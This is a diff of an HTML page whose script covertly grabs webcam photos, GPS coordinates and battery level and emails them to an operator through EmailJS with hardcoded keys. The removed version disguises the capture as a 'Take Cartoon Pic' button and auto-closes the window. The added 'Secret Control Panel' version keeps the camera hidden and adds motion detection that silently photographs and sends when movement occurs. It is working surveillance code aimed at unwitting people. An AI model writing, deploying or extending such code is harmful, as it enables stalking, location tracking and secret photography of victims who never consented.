@@ -1,116 +1,154 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secret Photo & Location</title>
+  <title>Secret Control Panel</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 60px;
-      background-color: #f4f4f4;
+      background-color: #121212;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
     }
     h2 {
-      color: #333;
+      margin-bottom: 20px;
     }
     button {
-      padding: 10px 20px;
-      font-size: 16px;
+      background-color: #1f1f1f;
+      color: #e0e0e0;
+      border: 1px solid #333;
+      padding: 12px 24px;
+      border-radius: 10px;
       margin: 10px;
       cursor: pointer;
-      border: none;
-      background-color: #4CAF50;
-      color: white;
-      border-radius: 8px;
+      font-size: 16px;
+      transition: background 0.3s;
     }
     button:hover {
-      background-color: #45a049;
+      background-color: #2a2a2a;
+    }
+    #video, #canvas {
+      display: none;
     }
     #status {
-      margin-top: 30px;
-      font-weight: bold;
-      font-size: 18px;
-      color: #555;
+      margin-top: 20px;
+      color: #90caf9;
     }
   </style>
 </head>
 <body>
-  <h2>Choose an Option</h2>
-  <button onclick="sendLocationOnly()">Check Your Location </button>
-  <button onclick="captureAndSend()">Take Cartoon Pic</button>
-
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div id="status"></div>
+  <h2>Secret Control Panel</h2>
+  <button onclick="sendLocationOnly()">Check Location Only</button>
+  <button onclick="captureAndSend()">Take Picture + Location</button>
+  <button onclick="startMotionDetection()">Start Motion Detection</button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <div id="status">Waiting for command...</div>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("vyxyeBFTfSi_ISmNG");
+    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your EmailJS Public Key
 
-    function updateStatus(message, done = false) {
-      const status = document.getElementById("status");
-      status.textContent = message;
-      if (done) {
-        setTimeout(() => {
-          window.close(); // Try to auto-close
-        }, 5000);
-      }
+    const statusDiv = document.getElementById("status");
+
+    function updateStatus(message) {
+      statusDiv.textContent = message;
     }
 
     function sendLocationOnly() {
-      updateStatus("Processing location... please wait");
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-        emailjs.send("service_gkkpt4w", "template_96dsagv", {
-          message: message,
-          image: ''
-        })
-        .then(res => updateStatus("Sent to your inbox!", true))
-        .catch(err => updateStatus("Failed to send location."));
-      }, function(error) {
-        alert("Could not get location.");
-        console.error(error);
+      updateStatus("Processing location...");
+      navigator.geolocation.getCurrentPosition(position => {
+        const battery = navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1 });
+        battery.then(bat => {
+          const message = `Location: Latitude ${position.coords.latitude}, Longitude ${position.coords.longitude}\nBattery: ${Math.round(bat.level * 100)}%`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: message,
+            image: ''
+          }).then(() => {
+            updateStatus("Location sent to your inbox.");
+          }).catch(() => {
+            updateStatus("Failed to send location.");
+          });
+        });
+      }, () => {
+        updateStatus("Failed to get location.");
       });
     }
 
     async function captureAndSend() {
-      updateStatus("Processing image and location... please wait");
+      updateStatus("Capturing image and location...");
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
-
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
-      await new Promise(resolve => setTimeout(resolve, 1500));
+      await new Promise(r => setTimeout(r, 1500));
       canvas.width = 160;
       canvas.height = 120;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageBase64 = canvas.toDataURL("image/png");
       stream.getTracks().forEach(track => track.stop());
 
-      navigator.geolocation.getCurrentPosition(async function(position) {
-        const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-        let batteryLevel = "Unknown";
+      navigator.geolocation.getCurrentPosition(position => {
+        navigator.getBattery().then(bat => {
+          const message = `Location: Latitude ${position.coords.latitude}, Longitude ${position.coords.longitude}\nBattery: ${Math.round(bat.level * 100)}%`;
+          emailjs.send("service_gkkpt4w", "template_96dsagv", {
+            message: message,
+            image: imageBase64
+          }).then(() => {
+            updateStatus("Photo and location sent to your inbox.");
+          }).catch(() => {
+            updateStatus("Failed to send photo.");
+          });
+        });
+      }, () => {
+        updateStatus("Failed to get location.");
+      });
+    }
 
-        if (navigator.getBattery) {
-          try {
-            const battery = await navigator.getBattery();
-            batteryLevel = `${Math.round(battery.level * 100)}%`;
-          } catch (err) {
-            console.warn("Battery info not available", err);
-          }
+    async function startMotionDetection() {
+      updateStatus("Starting motion detection...");
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+      const prevImage = document.createElement('canvas');
+      const prevCtx = prevImage.getContext("2d");
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      canvas.width = prevImage.width = 160;
+      canvas.height = prevImage.height = 120;
+
+      const checkMotion = () => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const currentFrame = context.getImageData(0, 0, canvas.width, canvas.height).data;
+        const prevFrame = prevCtx.getImageData(0, 0, prevImage.width, prevImage.height).data;
+        let changedPixels = 0;
+
+        for (let i = 0; i < currentFrame.length; i += 4) {
+          const diff = Math.abs(currentFrame[i] - prevFrame[i]) +
+                       Math.abs(currentFrame[i + 1] - prevFrame[i + 1]) +
+                       Math.abs(currentFrame[i + 2] - prevFrame[i + 2]);
+          if (diff > 60) changedPixels++;
         }
 
-        const message = `${coords}, Battery: ${batteryLevel}`;
-        emailjs.send("service_gkkpt4w", "template_96dsagv", {
-          message: message,
-          image: imageBase64
-        })
-        .then(res => updateStatus("Sent to your inbox!", true))
-        .catch(err => updateStatus("Failed to send photo and location."));
-      }, function(error) {
-        alert("Could not get location.");
-        console.error(error);
-      });
+        if (changedPixels > 500) {
+          updateStatus("Motion detected! Sending alert...");
+          stream.getTracks().forEach(track => track.stop());
+          captureAndSend();
+        } else {
+          prevCtx.drawImage(canvas, 0, 0);
+          setTimeout(checkMotion, 1000);
+        }
+      };
+
+      prevCtx.drawImage(video, 0, 0, prevImage.width, prevImage.height);
+      setTimeout(checkMotion, 1000);
     }
   </script>
 </body>
